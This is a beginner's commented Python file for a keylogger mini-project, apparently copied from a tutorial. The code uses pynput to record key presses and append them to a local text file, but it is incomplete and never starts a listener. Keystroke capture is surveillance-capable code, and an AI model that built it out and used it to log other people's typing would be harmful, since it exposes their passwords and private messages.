'''
key logger project to create key logger to store key presses in text files

project courtesy https://towardsdatascience.com/10-python-mini-projects-that-everyone-should-build-with-code-769c6f1af0c4
'''

# installed pynput using pip3 install pynput
# nothing happens when run script 
from pynput.keyboard import Key, Controller, Listener
# searched if time is built-into python and see time library is but unclear if is same as this 'import time'
import time
# assigning value of keyboard to Controller() function
keyboard = Controller()

# assigns/initializes variable keys to empty list
keys = []

# outlines what supposed to happen: store value of key when key pressed, global keys?, replace value of keys with strings - empty space or not, attach to end of keys string, set main_string variable to store value of keys through join function with no delimeter, print main_string variable value, if length of main_string variable less than 15 and open function of two parameters - text file named keys and a? but entire open() being referenced as f then execute f with write function passing main_string, variable keys initialized/assigned empty list to be populated with value of keys being logged, define second main function named oppostie of initial main function of on_press() to on_release() and if key pressed/logged equals escape key then return boolean value False
def on_press(key):
    global keys
    string = str(key).replace(" ", "")
    keys.append(string)
    main_string = "".join(keys)
    print(main_string)
    if len(main_string) > 15:
        with open('keys.txt', 'a') as f:
            f.write(main_string)
            keys = []
def on_release(key):
    if key == Key.esc:
        return False
